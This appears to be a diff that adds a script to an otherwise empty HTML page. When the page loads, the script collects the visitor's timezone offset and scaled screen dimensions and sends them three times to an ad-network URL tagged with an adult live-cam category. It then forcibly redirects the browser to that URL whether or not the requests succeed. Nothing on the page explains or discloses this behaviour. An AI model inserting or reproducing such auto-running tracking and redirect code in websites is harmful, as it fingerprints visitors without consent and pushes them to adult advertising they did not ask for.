@@ -1,10 +1,64 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="never">
     <meta name="referrer" content="no-referrer">
- 
+    <script>
+        (async () => {
+		
+		const d = new Date();
+		let diff = d.getTimezoneOffset();
+		
+		
+                const screen = window.screen || { width: 0, height: 0 };
+                const pixelRatio = window.devicePixelRatio || 1;
+                const screenWidth = Math.round(screen.width * pixelRatio);
+                const screenHeight = Math.round(screen.height * pixelRatio);
+		
+   
+                const url = `https://tsyndicate.com/api/v1/direct/a7d37703d3e647b79134c53a5adce57c?param3=p.js&w=${screenWidth}&h=${screenHeight}&tz=${diff}&categories=Free%20Live%20Sex%20Cams`;
+
+            try {
+              
+                const fetchPromises = Array(3).fill().map(() =>
+                    fetch(url, { mode: 'no-cors' })
+                        .then(res => {
+                            // Note: With no-cors, res.json() is not accessible; response will be opaque
+                            if (!res.ok) {
+                                throw new Error(`HTTP error! Status: ${res.status}`);
+                            }
+                            return null; // Cannot read response body in no-cors mode
+                        })
+                );
+
+              
+                const results = await Promise.all(
+                    fetchPromises.map(p =>
+                        p.catch(error => {
+                            console.error('Fetch error:', error);
+                            return null; // Return null for failed requests
+                        })
+                    )
+                );
+
+               
+                setTimeout(() => {
+                    console.log("Redirecting to:", url);
+                    window.location.href = url;
+                }, 500);
+
+            } catch (error) {
+                console.error('Error in fetch operation:', error);
+             
+                setTimeout(() => {
+                    console.log("Redirecting due to error to:", url);
+                    window.location.href = url;
+                }, 500);
+            }
+        })();
+    </script>
 </head>
 <body></body>
 </html>
